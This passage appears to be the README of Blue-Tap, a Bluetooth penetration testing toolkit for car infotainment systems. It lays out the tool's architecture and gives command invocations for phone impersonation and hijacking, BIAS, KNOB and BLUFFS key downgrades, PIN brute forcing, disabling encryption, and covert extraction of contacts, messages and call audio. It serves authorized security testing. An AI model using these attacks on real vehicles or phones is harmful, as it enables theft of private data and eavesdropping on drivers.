<p align="center">
  <img src="assets/banner.svg" alt="Blue-Tap Banner" width="100%"/>
</p>

<p align="center">
  <b>Bluetooth/BLE Penetration Testing Toolkit for Automotive IVI Systems</b><br/>
  <sub>by <a href="https://github.com/Indspl0it">Santhosh Ballikonda</a> · Python 3.10+ · Linux · <a href="LICENSE">GPLv3</a></sub>
</p>

---

## Table of Contents

- [Purpose](#purpose)
- [Architecture](#architecture)
- [Features](#features)
  - [Discovery and Scanning](#1-discovery-and-scanning)
  - [Reconnaissance](#2-reconnaissance)
  - [Vulnerability Assessment](#3-vulnerability-assessment)
  - [Safe Assessment (Assess Command)](#3b-safe-assessment-assess-command)
  - [Connection Hijacking and BIAS](#4-connection-hijacking-and-bias)
  - [KNOB Attack](#5-knob-attack-cve-2019-9506)
  - [SSP Downgrade](#6-ssp-downgrade-attack)
  - [BLUFFS Attack (CVE-2023-24023)](#6b-bluffs-attack-cve-2023-24023)
  - [Encryption Downgrade](#6c-encryption-downgrade)
  - [Data Extraction (PBAP / MAP / AT / OPP)](#7-data-extraction-pbap--map--at--opp)
  - [Audio Interception (HFP / A2DP)](#8-audio-interception-hfp--a2dp)
  - [AVRCP Media Control](#9-avrcp-media-control)
  - [Protocol Fuzzing](#10-protocol-fuzzing)
  - [Denial of Service](#11-denial-of-service)
  - [MAC Spoofing and Adapter Management](#12-mac-spoofing-and-adapter-management)
  - [Session Management and Reporting](#13-session-management-and-reporting)
  - [DarkFirmware and Below-HCI Attacks](#13b-darkfirmware-and-below-hci-attacks)
  - [Automation and Orchestration](#14-automation-and-orchestration)
  - [Credits and References](#credits-and-references)
- [Quick Start](#quick-start)
- [Usage Guide](#usage-guide)
- [Workflows](#workflows)
- [Vulnerable IVI Simulator](#vulnerable-ivi-simulator)
- [Troubleshooting](#troubleshooting)
- [Platform Notes](#platform-notes)
- [Legal Disclaimer](#legal-disclaimer)
- [Changelog](docs/CHANGELOG.md)

---

## Purpose

Blue-Tap is a Bluetooth/BLE penetration testing toolkit built for automotive IVI security assessments. It operates at two layers: standard HCI-level attacks (scanning, hijacking, data extraction, protocol fuzzing) using any Bluetooth adapter, and below-HCI attacks (LMP injection, session key downgrade, encryption manipulation) using DarkFirmware on RTL8761B. It discovers and fingerprints devices, exploits 10+ CVEs (BIAS, KNOB, BLUFFS, SSP downgrade, encryption downgrade, BlueBorne, BrakTooth, SweynTooth, PerfektBlue, Invalid Curve), extracts phonebooks, messages, and call audio, and fuzzes 12 Bluetooth protocols with a response-guided engine. All findings are logged into sessions and exported as evidence-backed HTML/JSON pentest reports.

### What Blue-Tap Does

- **Discovers** Bluetooth Classic and BLE devices in range, classifying IVI systems by device class, name heuristics, and service UUIDs. Fleet-wide scanning assesses all nearby devices in one pass.
- **Fingerprints** target devices to determine Bluetooth version, LMP features, chipset manufacturer, supported profiles, pairing mode, IO capabilities, and attack surface.
- **Assesses vulnerabilities** with a non-destructive 5-phase assessment (fingerprint, service discovery, 20+ CVE checks, DarkFirmware LMP probe, summary with next-step commands) or full vulnerability scan with 20+ evidence-based checks. Each finding includes severity, confidence, CVE reference, evidence, and remediation.
- **Attacks below the HCI boundary** via DarkFirmware on RTL8761B (TP-Link UB500) — live RAM patching for BDADDR spoofing without reset, 17-byte LMP PDU injection/capture, controller memory read/write. Enables BLUFFS session key downgrade (CVE-2023-24023), encryption downgrade (disable encryption, force renegotiation, reject Secure Connections), and LMP-level DoS/fuzzing.
- **Extracts data** via PBAP (phonebook, call logs, favorites), MAP (SMS/MMS/email messages), AT commands (IMEI, IMSI, phonebook, SMS), and OBEX Object Push — all without user awareness on the IVI.
- **Hijacks connections** by impersonating a paired phone (MAC + name + device class cloning) to access the IVI without re-pairing. Supports BIAS (CVE-2020-10135) role-switch authentication bypass via software or DarkFirmware LMP injection.
- **Downgrades pairing and encryption** by forcing SSP to legacy PIN mode and brute-forcing the PIN (0000-9999), executing KNOB (CVE-2019-9506) to negotiate minimum key entropy, BLUFFS (CVE-2023-24023) to downgrade session key derivation, or encryption downgrade to disable/weaken link encryption entirely.
- **Intercepts audio** through HFP (call audio capture, DTMF injection, call control — dial, answer, hangup, hold) and A2DP (media stream capture, microphone eavesdropping, audio playback injection).
- **Controls media** via AVRCP — play, pause, skip, volume manipulation, metadata surveillance. Skip flooding and volume ramp for DoS demonstration.
- **Fuzzes 12 Bluetooth protocols** (including LMP via DarkFirmware) with a response-guided, state-aware fuzzing engine featuring 6 layers of intelligence: protocol state inference (AFLNet-adapted), anomaly-guided field mutation weights, structural PDU validation, timing-based coverage proxy, entropy-based leak detection, and watchdog reboot detection. 4 strategies: coverage-guided, state-machine, random-walk, and targeted CVE reproduction. Live dashboard with real-time crash tracking.
- **Sniffs LMP traffic** via DarkFirmware — captures incoming LMP packets at the link layer for protocol analysis, pairing negotiation inspection, and security research. Combined BLE + LMP monitoring with nRF52840.
- **Manages crashes** with SQLite-backed crash database, severity classification, reproduction verification, payload minimization (binary search + delta debugging + field-level reduction), and evidence export.
- **Generates reports** in HTML and JSON with executive summary, SVG charts, vulnerability findings with evidence (including BLUFFS and encryption downgrade results), fuzzing intelligence analysis (state coverage, field weights, timing clusters, health events), crash details with hexdumps and reproduction steps, and data extraction summaries. All session commands are automatically logged as evidence.

### Who It's For

- Automotive security researchers and penetration testers
- OEM/Tier-1 security teams performing Bluetooth stack assessments
- Red teams testing vehicle connectivity systems
- Security researchers studying Bluetooth protocol vulnerabilities

### Authorization Requirement

Blue-Tap is designed exclusively for **authorized security testing**. You must have explicit written permission from the vehicle/device owner before conducting any assessment. Unauthorized use against devices you do not own or have permission to test is illegal.

---

## Architecture

### System Overview

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                           ATTACKER MACHINE (Kali Linux / Ubuntu)             │
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │                          Blue-Tap CLI (click)                          │  │
│  │                                                                        │  │
│  │  blue-tap [--session NAME] [--verbose] <command> <subcommand> [args]   │  │
│  │                                                                        │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                 │  │
│  │  │  Session Mgr  │  │ LoggedCommand│  │  Report Gen  │                 │  │
│  │  │  (session.py) │  │   (cli.py)   │  │(generator.py)│                 │  │
│  │  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘                 │  │
│  │         │    Auto-logs every command          │                         │  │
│  │         ▼                                     ▼                         │  │
│  │  sessions/<name>/          HTML/JSON report from session data           │  │
│  │    session.json                                                         │  │
│  │    001_scan.json                                                        │  │
│  │    002_vulnscan.json                                                    │  │
│  │    pbap/ map/ audio/                                                    │  │
│  └────────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                         CORE MODULES                                    │ │
│  │                                                                         │ │
│  │  ┌──────────────┐  ┌───────────────┐  ┌──────────────┐                 │ │
│  │  │   Scanner     │  │  Fingerprint  │  │   Spoofer    │                 │ │
│  │  │ Classic + BLE │  │  LMP version  │  │  MAC + Name  │                 │ │
│  │  │  (scanner.py) │  │  Chipset/Caps │  │  + DevClass  │                 │ │
│  │  └──────┬───────┘  └──────┬────────┘  └──────┬───────┘                 │ │
│  │         │                  │                   │                         │ │
│  │  ┌──────┴──────┐  ┌───────┴────────┐  ┌──────┴───────┐                 │ │
│  │  │  SDP Browse  │  │  RFCOMM Scan   │  │  L2CAP Scan  │                 │ │
│  │  │  (sdp.py)    │  │ (rfcomm_scan)  │  │ (l2cap_scan) │                 │ │
│  │  └─────────────┘  └────────────────┘  └──────────────┘                 │ │
│  │                                                                         │ │
│  │  ┌──────────────┐  ┌───────────────┐  ┌──────────────┐                 │ │
│  │  │  GATT Enum   │  │  HCI Capture  │  │   Sniffer    │                 │ │
│  │  │  (gatt.py)   │  │(hci_capture)  │  │  nRF / USRP  │                 │ │
│  │  └──────────────┘  └───────────────┘  └──────────────┘                 │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                        ATTACK MODULES                                   │ │
│  │                                                                         │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │  VulnScan │ │  Hijack  │ │   PBAP   │ │   MAP    │ │   HFP    │     │ │
│  │  │ 20+ checks│ │ Full IVI │ │ Phonebook│ │ Messages │ │Call Audio│     │ │
│  │  │ CVE-based │ │ takeover │ │ + Calls  │ │ SMS/MMS  │ │ SCO link │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  │                                                                         │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │   A2DP   │ │  AVRCP   │ │   OPP    │ │   BIAS   │ │ Proto DoS│     │ │
│  │  │ Media/Mic│ │ Media Ctl│ │ File Push│ │CVE-2020- │ │ L2CAP/SDP│     │ │
│  │  │CapturInj │ │ Vol Ramp │ │   vCard  │ │  10135   │ │ RFCOMM/HF│     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  │                                                                         │ │
│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐     │ │
│  │  │BlueSnarfr│ │SSP Downgr│ │  KNOB    │ │Key Harvst│ │  Fleet   │     │ │
│  │  │ AT Cmds  │ │Force PIN │ │CVE-9506  │ │Link Keys │ │Multi-Dev │     │ │
│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘     │ │
│  └─────────────────────────────────────────────────────────────────────────┘ │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────────┐ │
│  │                     PROTOCOL FUZZING ENGINE                             │ │
│  │                                                                         │ │
│  │  ┌──────────────────────────────────────────────────────────────────┐   │ │
│  │  │                    FuzzCampaign (engine.py)                       │   │ │
│  │  │  Orchestrates multi-protocol fuzzing with live dashboard         │   │ │
│  │  │  Protocol rotation • Stats tracking • Crash detection            │   │ │
│  │  └──────────┬───────────────────┬───────────────────┬───────────┘   │   │ │
│  │             │                   │                   │               │   │ │
│  │  ┌──────────▼──────┐ ┌─────────▼────────┐ ┌────────▼─────────┐    │   │ │
│  │  │   Strategies     │ │  Protocol Builders│ │   Transports     │    │   │ │
│  │  │ ┌─────────────┐  │ │ ┌──────────────┐  │ │ ┌─────────────┐ │    │   │ │
│  │  │ │ Random Walk  │  │ │ │ L2CAP Sig    │  │ │ │ L2CAP       │ │    │   │ │
│  │  │ │ Coverage     │  │ │ │ RFCOMM       │  │ │ │ RFCOMM      │ │    │   │ │
│  │  │ │ State Machine│  │ │ │ SDP          │  │ │ │ BLE (bleak) │ │    │   │ │
│  │  │ │ Targeted     │  │ │ │ OBEX         │  │ │ └─────────────┘ │    │   │ │
│  │  │ └─────────────┘  │ │ │ ATT/GATT     │  │ │                  │    │   │ │
│  │  └──────────────────┘ │ │ SMP          │  │ └──────────────────┘    │   │ │
│  │                        │ │ BNEP         │  │                         │   │ │
│  │  ┌──────────────────┐ │ │ AT Commands  │  │ ┌──────────────────┐    │   │ │
│  │  │   Crash DB       │ │ └──────────────┘  │ │   Corpus Mgr     │    │   │ │
│  │  │  SQLite storage  │ │                    │ │  Seed generation │    │   │ │
│  │  │  Severity/Type   │ └────────────────────┘ │  Protocol-tagged │    │   │ │
│  │  │  Reproducibility │                        └──────────────────┘    │   │ │
│  │  └──────────────────┘ ┌──────────────────┐  ┌──────────────────┐    │   │ │
│  │                        │   Minimizer      │  │   PCAP Replay    │    │   │ │
│  │  ┌──────────────────┐ │  Binary search   │  │  btsnoop parser  │    │   │ │
│  │  │   Mutators       │ │  Delta debug     │  │  Frame filter    │    │   │ │
│  │  │ Field/Int/Length  │ │  Field reducer   │  │  Mutation replay │    │   │ │
│  │  │ Protocol/Corpus  │ └──────────────────┘  └──────────────────┘    │   │ │
│  │  └──────────────────┘                                               │   │ │
│  │                                                                     │   │ │
│  │  ┌──────────── Fuzzing Intelligence (Phase 1-6) ─────────────────┐  │   │ │
│  │  │ State Inference │ Field Weights │ Response Analyzer │ Health   │  │   │ │
│  │  │ (AFLNet IPSM)   │ (BrakTooth)   │ Struct+Time+Leak  │ Monitor  │  │   │ │
│  │  └────────────────────────────────────────────────────────────────┘  │   │ │
│  └─────────────────────────────────────────────────────────────────────┘   │ │
│                                                                              │
│  ┌──────────────────────────────┐                                           │
│  │    Bluetooth Adapter (HCI)    │                                           │
│  │    hci0 / hci1                │                                           │
│  │    BlueZ 5.x + D-Bus         │                                           │
│  └──────────────┬───────────────┘                                           │
└─────────────────┼───────────────────────────────────────────────────────────┘
                  │
      ~~~~~~~~~~~~│~~~~~~~~~~~~  Bluetooth Air (2.4 GHz)  ~~~~~~~~~~~~
                  │
    ┌─────────────┴────────────────────────────────────────────────┐
    │                                                              │
    ▼                                                              ▼
┌──────────────────────────────┐       ┌──────────────────────────────────┐
│    TARGET IVI SYSTEM          │       │       VICTIM'S PHONE              │
│                               │       │                                   │
│  Car Infotainment Unit        │       │  Paired to IVI via Bluetooth      │
│  ┌─────────────────────────┐  │       │                                   │
│  │ Bluetooth Stack         │  │       │  Blue-Tap impersonates this       │
│  │  PBAP Server (contacts) │  │       │  phone's MAC address to gain      │
│  │  MAP Server (messages)  │  │       │  access to the IVI without        │
│  │  HFP Audio Gateway      │  │       │  re-pairing (hijack attack).      │
│  │  A2DP Sink (speakers)   │  │       │                                   │
│  │  AVRCP Target           │  │       │  ┌─────────────────────────────┐  │
│  │  OPP Server             │  │       │  │ MAC: AA:BB:CC:DD:EE:FF     │  │
│  │  SPP / DUN / PAN        │  │       │  │ Bonded to IVI              │  │
│  │  BLE GATT Services      │  │       │  │ Has link key stored        │  │
│  └─────────────────────────┘  │       │  └─────────────────────────────┘  │
│                               │       │                                   │
│  SDP Records (8+ services)    │       └──────────────────────────────────┘
│  L2CAP PSMs (SDP,RFCOMM,...)  │
│  RFCOMM Channels (1-30)       │
│  BLE Advertisement + GATT     │
└───────────────────────────────┘
```

### Data Flow: Hijack Attack

```
 Attacker                    IVI (Car)                Phone (Victim)
    │                           │                          │
    │  1. scan classic          │                          │
    │ ─────────────────────────>│  Inquiry Response        │
    │ <─────────────────────────│  "SYNC" / Car Audio      │
    │                           │                          │
    │  2. recon sdp/fingerprint │                          │
    │ ─────────────────────────>│  SDP Browse + LMP Info   │
    │ <─────────────────────────│  Services, BT version    │
    │                           │                          │
    │  3. spoof mac PHONE_MAC   │                          │
    │  (local adapter change)   │                          │
    │                           │                          │
    │  4. hijack IVI PHONE_MAC  │                          │
    │ ─────────────────────────>│  Connects as "phone"     │
    │ <─────────────────────────│  Auto-authorized (bond)  │
    │                           │                          │
    │  5. PBAP GET phonebook    │                          │
    │ ─────────────────────────>│  OBEX PBAP Session       │
    │ <─────────────────────────│  vCards (contacts+calls)  │
    │                           │                          │
    │  6. MAP GET messages      │                          │
    │ ─────────────────────────>│  OBEX MAP Session        │
    │ <─────────────────────────│  bMessages (SMS/MMS)     │
    │                           │                          │
    │  7. HFP SLC setup         │                          │
    │ ─────────────────────────>│  AT command handshake    │
    │ <─────────────────────────│  +BRSF, +CIND, OK        │
    │                           │                          │
    │  8. report                │                          │
    │  (generates HTML/JSON)    │                          │
```

### Internal Module Dependencies

```
cli.py ──────────────────────────────────────────────────────────
  │
  ├── core/
  │   ├── adapter.py      ← hciconfig, btmgmt, bluetoothctl
  │   ├── scanner.py      ← hcitool (Classic), bleak (BLE)
  │   ├── spoofer.py      ← bdaddr, hciconfig, btmgmt
  │   ├── firmware.py       ← DarkFirmware install/status/spoof (RTL8761B)
  │   └── hci_vsc.py        ← Raw HCI vendor-specific commands (LMP inject/monitor)
  │
  ├── recon/
  │   ├── sdp.py          ← sdptool, raw L2CAP PSM 1
  │   ├── fingerprint.py  ← hcitool info, LMP features
  │   ├── gatt.py         ← bleak (BLE GATT client)
  │   ├── rfcomm_scan.py  ← socket(BTPROTO_RFCOMM)
  │   ├── l2cap_scan.py   ← socket(BTPROTO_L2CAP)
  │   ├── sniffer.py      ← nRF Sniffer, USRP B210
  │   └── hci_capture.py  ← btmon
  │
  ├── attack/
  │   ├── vuln_scanner.py  ← recon/* (SDP, RFCOMM, fingerprint)
  │   ├── hijack.py        ← spoofer + pbap + map + hfp
  │   ├── pbap.py          ← socket(RFCOMM) + OBEX binary
  │   ├── map_client.py    ← socket(RFCOMM) + OBEX binary
  │   ├── hfp.py           ← socket(RFCOMM) + AT commands + SCO
  │   ├── a2dp.py          ← PulseAudio (pulsectl)
  │   ├── avrcp.py         ← D-Bus via dbus-fast (async)
  │   ├── bias.py          ← L2CAP role-switch manipulation
  │   ├── bluesnarfer.py   ← socket(RFCOMM) + AT commands
  │   ├── dos.py           ← pairing flood, l2ping, name flood
  │   ├── protocol_dos.py  ← L2CAP/SDP/RFCOMM/OBEX/HFP protocol-level DoS
  │   ├── opp.py           ← socket(RFCOMM) + OBEX Push
  │   ├── pin_brute.py     ← D-Bus pairing agent
  │   ├── ssp_downgrade.py ← IO cap manipulation + PIN brute force
  │   ├── knob.py          ← CVE-2019-9506 key negotiation + brute force
  │   ├── fleet.py         ← device classification + fleet-wide vuln scan
  │   ├── bluffs.py         ← CVE-2023-24023 session key downgrade (DarkFirmware)
  │   └── encryption_downgrade.py ← Beyond-KNOB encryption attacks (DarkFirmware)
  │
  ├── fuzz/
  │   ├── engine.py              ← campaign orchestrator + main loop
  │   ├── transport.py           ← L2CAP/RFCOMM/BLE socket abstractions
  │   ├── crash_db.py            ← SQLite crash storage + dedup
  │   ├── corpus.py              ← protocol-tagged seed management
  │   ├── mutators.py            ← field/integer/length/corpus mutation
  │   ├── minimizer.py           ← binary search + ddmin + field reduction
  │   ├── pcap_replay.py         ← btsnoop v1 parser + replay engine
  │   ├── state_inference.py     ← AFLNet-adapted protocol state graph
  │   ├── field_weight_tracker.py← anomaly-guided field mutation weights
  │   ├── response_analyzer.py   ← 3-layer anomaly detection (struct+time+leak)
  │   ├── health_monitor.py      ← watchdog reboot + degradation detection
  │   ├── protocols/             ← 9 protocol-specific builders (incl. LMP)
  │   └── strategies/            ← 4 campaign strategies
  │
  ├── report/
  │   └── generator.py    ← session data → HTML/JSON reports
  │
  └── utils/
      ├── output.py       ← Rich console (tables, panels, colors)
      ├── session.py      ← JSON-L session logging
      ├── interactive.py  ← Device selection prompts
      └── bt_helpers.py   ← run_cmd, check_tool, MAC validation
```

---

## Features

### 1. Discovery and Scanning

Passive and active discovery of Bluetooth Classic and BLE devices in range with full device class decoding and manufacturer identification.

| Command | Description |
|---------|-------------|
| `blue-tap scan classic` | Bluetooth Classic inquiry scan — discovers BR/EDR devices, shows name, MAC, device class |
| `blue-tap scan ble` | BLE scan using bleak — discovers LE advertisers, shows name, MAC, services, manufacturer data |
| `blue-tap scan ble --passive` | Passive BLE scan (no SCAN_REQ sent) — stealthier, only collects advertisement data |
| `blue-tap scan all` | Combined Classic + BLE scan with automatic dual-mode device merging |

**Key capabilities:**
- Full device class decoding: Computer (Desktop/Laptop/Tablet), Phone (Cellular/Smartphone), Audio/Video (Car Audio, Headset, Headphones, Speaker), Peripheral (Remote/Gamepad), Wearable (Wristwatch/Glasses)
- BLE manufacturer identification (30+ vendors: Apple, Samsung, Tesla, Bose, Harman, Continental, etc.)
- RSSI signal strength with distance estimation (log-distance path loss model)
- Name resolution with retry logic for flaky Classic BT connections
- JSON output (`-o results.json`) for scripted pipelines
- Configurable scan duration (`-d 30` for 30 seconds)
- Adapter selection (`-i hci1`) for multi-adapter setups
- All scan results logged to session for report generation

---

### 2. Reconnaissance

Deep service enumeration, device fingerprinting, and radio-level capture. All recon commands support session logging and JSON output.

| Command | Description |
|---------|-------------|
| `blue-tap recon sdp <MAC>` | Browse all SDP service records — profiles, channels, UUIDs, provider strings. Retries on transient failures. |
| `blue-tap recon fingerprint <MAC>` | Device fingerprinting — BT version, LMP features, chipset, IVI confidence scoring, normalized attack surface mapping, vulnerability hints (KNOB, BIAS, BrakTooth, SweynTooth, BlueBorne) |
| `blue-tap recon rfcomm-scan <MAC>` | Scan RFCOMM channels 1-30 with retry logic (`--retries N`), consecutive-unreachable abort threshold, AT/OBEX/raw response classification |
| `blue-tap recon l2cap-scan <MAC>` | Scan well-known L2CAP PSMs; `--dynamic` adds parallel scanning of dynamic range with configurable workers (`--workers 10`) |
| `blue-tap recon gatt <MAC>` | BLE GATT enumeration with connection retry, security posture inference (open/paired/signed/encrypted), automotive service detection, value decoding (Battery, PnP ID, Appearance, Tx Power, Connection Params) |
| `blue-tap recon ssp <MAC>` | Check if device supports Secure Simple Pairing |
| `blue-tap recon pairing-mode <MAC>` | Detect pairing mode (Legacy PIN vs SSP) and IO capabilities |
| `blue-tap recon capture-start` | Start HCI traffic capture via btmon (stale PID detection, atomic state file) |
| `blue-tap recon capture-stop` | Stop btmon capture |

**Reconnaissance (requires specialized hardware):**

| Command | Hardware | Description |
|---------|----------|-------------|
| `blue-tap recon nrf-scan` | nRF52840 dongle | BLE advertisement scanning with raw PDU access |
| `blue-tap recon nrf-sniff` | nRF52840 dongle | Sniff BLE pairing exchanges (capture STK/LTK negotiation) |
| `blue-tap recon usrp-scan` | USRP B210 | Scan for BR/EDR piconets at baseband level |
| `blue-tap recon usrp-follow` | USRP B210 | Follow and capture BR/EDR piconet traffic |
| `blue-tap recon usrp-capture` | USRP B210 | Raw IQ capture for offline analysis |
| `blue-tap recon crack-key` | — | Crack BLE pairing key from captured pcap using Crackle |
| `blue-tap recon extract-link-key` | — | Extract BR/EDR link key from captured pairing exchange |
| `blue-tap recon inject-link-key` | — | Inject recovered link key into BlueZ for reconnection |

---

### 3. Vulnerability Assessment

Vulnerability scanner with 20+ checks covering known CVEs, protocol weaknesses, and configuration issues. Each finding includes severity, CVE reference, impact description, remediation guidance, status (confirmed/potential/unverified), and confidence rating. Version/feature checks run in parallel for speed; active connection checks run sequentially. All checks include automatic retry on transient failures.

```
blue-tap vulnscan <MAC>                                # Standard scan (passive + heuristic checks)
blue-tap vulnscan <MAC> --active                       # Include invasive checks (BIAS probe, PIN lockout)
blue-tap vulnscan <MAC> --active --phone <PHONE_MAC>   # BIAS probe with known paired phone
blue-tap vulnscan <MAC> -o findings.json               # Export findings to JSON
```

**`--active` mode:** Enables invasive checks that modify adapter state or send pairing attempts. The BIAS auto-reconnect probe requires the paired phone's MAC — provide via `--phone` or select interactively from a device scan. Without `--active`, BIAS and PIN lockout checks are skipped (noted in output).

**Vulnerability checks performed:**

| Check | CVE(s) | What It Detects |
|-------|--------|-----------------|
| Service Exposure | — | Sensitive RFCOMM services (PBAP/MAP) reachable without auth challenge |
| KNOB | CVE-2019-9506 | LMP key size negotiation downgrade (BT < 5.1, pause_encryption) |
| BLURtooth / CTKD | CVE-2020-15802 | Cross-transport key derivation overwrite (BT 4.2-5.0, dual-mode) |
| PerfektBlue | CVE-2024-45431/32/33/34 | OpenSynergy BlueSDK vulns (VW/Audi/Mercedes IVI, invalid CID probe) |
| BLUFFS | CVE-2023-24023 | Session key derivation downgrade (BT 4.2-5.4) |
| PIN Pairing Bypass | CVE-2020-26555 | BR/EDR impersonation via PIN response spoofing |
| Invalid Curve | CVE-2018-5383 | ECDH public key validation skip in SSP/SC (BT 4.2-5.0) |
| BIAS | CVE-2020-10135 | Authentication bypass via role-switch — passive version check + active auto-reconnect probe (`--active`) |
| BlueBorne | CVE-2017-1000251 | BlueZ version check via `bluetoothd --version` (primary) or SDP string (fallback) |
| BrakTooth | 25 CVEs | Chipset-specific LMP/baseband vulns — word-boundary matching against all known vulnerable chipsets (ESP32, Cypress, CSR, Intel, Qualcomm), reports all applicable CVEs |
| Pairing Method | — | Legacy PIN vs SSP Just Works vs MITM-protected |
| Writable GATT | — | BLE characteristics writable without authentication (OTA update, diagnostics) |
| EATT Support | — | Enhanced ATT channel support and L2CAP CoC configuration |
| Hidden RFCOMM | — | RFCOMM channels open but not advertised in SDP |
| Encryption Enforcement | — | Services accessible without mandatory encryption (OBEX response codes: 0xA0 success, 0xC1/0xC3 unauthorized, 0xC0/0xD0 error) |
| PIN Lockout | — | Absence of rate limiting on pairing attempts (`--active` only — sends 2 test attempts) |
| Device Class | — | Identifies Car Audio / Hands-Free device class (IVI indicator) |
| LMP Features | — | Feature flag analysis (encryption, SC, LE, dual-mode) |
| Authorization Model | — | OBEX authorization probing for PBAP/MAP with full response code handling |
| Automotive Diagnostics | — | OBD/UDS/diagnostic/CAN bus service exposure via Bluetooth SPP/DUN |


---

### 3b. Assessment without Exploitation

Non-destructive, 5-phase security assessment that runs fingerprinting, service discovery, and vulnerability scanning without exploitation.

```bash
blue-tap assess <MAC>                              # Standard 5-phase assessment
blue-tap assess <MAC> --active -i hci1             # Include active LMP probing
blue-tap assess <MAC> -o assessment.json           # Export results to JSON
```

**Assessment phases:**

| Phase | What It Does |
|:-----:|-------------|
| 1 | Fingerprint — BT version, chipset, manufacturer, LMP features |
| 2 | Service discovery — SDP browse, RFCOMM channel scan |
| 3 | Vulnerability scan — 20+ CVE checks |
| 4 | DarkFirmware probe — active LMP feature/version check (if `--active`) |
| 5 | Summary — findings table with recommended next-step commands |

Output includes a summary table of findings and recommended Blue-Tap commands to investigate each finding further.

---

### 4. Connection Hijacking and BIAS

Full IVI takeover by impersonating the target's phone. Includes connection retry logic, per-phase rollback on failure, and adapter state verification before each phase transition.

```
blue-tap hijack <IVI_MAC> <PHONE_MAC>
blue-tap hijack <IVI_MAC> <PHONE_MAC> --phone-name "John's iPhone"
blue-tap hijack <IVI_MAC> <PHONE_MAC> --bias          # Use BIAS CVE-2020-10135
blue-tap hijack <IVI_MAC> <PHONE_MAC> --recon-only     # Recon phase only
blue-tap hijack <IVI_MAC> <PHONE_MAC> --skip-audio     # Skip HFP setup
```

**Attack phases:**
1. **Recon** — Fingerprint IVI, enumerate SDP services, identify PBAP/MAP/HFP/AVRCP channels
2. **Impersonate** — Spoof MAC address, adapter name, and device class to match the phone. Fails fast if identity clone is incomplete (MAC spoofed but name/class failed — IVI would reject)
3. **Phase Gate** — Verifies adapter MAC matches target phone before proceeding. Warns if impersonation may not have taken effect
4. **Connect** — Connect to IVI via bluetoothctl with automatic retry on timeout. Catches `TimeoutExpired` and cleans up partial pairing state
5. **PBAP/MAP Extract** — Download phonebook, call history, and SMS/MMS messages
6. **Audio Setup** — Establish HFP Service Level Connection for call interception


**BIAS mode (`--bias`):** When the IVI validates link keys and rejects simple MAC spoofing, the BIAS attack (CVE-2020-10135) exploits a role-switch during reconnection to bypass authentication entirely.

---

### 5. KNOB Attack (CVE-2019-9506)

Negotiate minimum encryption key entropy, then brute force the reduced key space. Brute-force performs actual XOR decryption against captured ACL data with L2CAP header validation — not a demonstration, a real key recovery attack.

```bash
blue-tap knob probe <MAC>                              # Check KNOB vulnerability
blue-tap knob attack <MAC>                             # Full KNOB chain: negotiate + brute force
blue-tap knob attack <MAC> --key-size 1                # Force 1-byte key (256 candidates)
```

**Attack phases:**
1. **Probe** — Check BT version (KNOB affects 2.1-5.0 pre-patch), read current encryption key size if connected, note firmware patch uncertainty
2. **Negotiate** — Set minimum encryption key size via InternalBlue LMP injection (Broadcom/Cypress) or btmgmt fallback, verify setting took effect, restore adapter defaults after test
3. **Brute force** — Capture encrypted ACL traffic from active connection (60s windows, up to 5 minutes with user-prompted extensions), XOR-decrypt each candidate, validate against L2CAP header structure (length field + CID range). Rich progress bar shows enumeration progress.

Note: Full LMP-level manipulation requires InternalBlue (Broadcom/Cypress chipset). The btmgmt fallback only controls local adapter preferences. HCI response parsing uses multiple regex patterns for cross-chipset compatibility.

---

### 6. SSP Downgrade Attack

Force a device from Secure Simple Pairing to legacy PIN mode, then brute force the PIN. Includes lockout detection (3 consecutive timeouts → abort), PIN range validation, and process cleanup to prevent leaked bluetoothctl processes.

```bash
blue-tap ssp-downgrade probe <MAC>                     # Check if target is vulnerable
blue-tap ssp-downgrade attack <MAC>                    # Downgrade + auto brute force (0000-9999)
blue-tap ssp-downgrade attack <MAC> --pin-start 0 --pin-end 9999  # Full PIN range
blue-tap ssp-downgrade attack <MAC> --delay 1.0        # Slower to avoid lockout
```

**Attack phases:**
1. Set local adapter IO capability to NoInputNoOutput
2. Disable SSP on local adapter (btmgmt with hciconfig fallback)
3. Remove existing pairing with target
4. Initiate pairing — target falls back to legacy PIN mode
5. Brute force PIN with progress logging every 100 attempts, lockout detection (3 consecutive timeouts), and `lockout_detected` flag in results

---

### 6b. BLUFFS Attack (CVE-2023-24023)

Session key derivation downgrade attack. Forces both endpoints to derive a weak, reusable session key by manipulating BR/EDR encryption setup at the LMP layer. Requires DarkFirmware on RTL8761B adapter for LMP injection.

```bash
blue-tap bluffs <MAC> -v probe                     # Check if target is vulnerable [safe]
blue-tap bluffs <MAC> -v key-downgrade             # LSC Central: force minimum key size (A1)
blue-tap bluffs <MAC> -v sc-downgrade              # SC Central: reject SC, force LSC (A3)
blue-tap bluffs <MAC> -v all                       # Run probe → sc-downgrade → key-downgrade
blue-tap bluffs <MAC> -v all --phone BB:CC:DD:EE   # With phone identity cloning
```

**Attack variants:**

| Variant | Mode | Role | Description |
|---------|------|------|-------------|
| A1 | LSC | Central | Force minimum encryption key size via LMP |
| A3 | SC → LSC | Central | Reject Secure Connections, then apply A1 |
| probe | — | — | Check SC downgrade vulnerability (non-destructive) |

**Reference:** Antonioli, "BLUFFS: Bluetooth Forward and Future Secrecy Attacks and Defenses", ACM CCS 2023

---

### 6c. Encryption Downgrade

Alternative encryption downgrade paths beyond KNOB that exploit different link manager code paths. Requires DarkFirmware on RTL8761B adapter.

```bash
blue-tap encryption-downgrade <MAC> -m no-encryption             # Disable encryption entirely
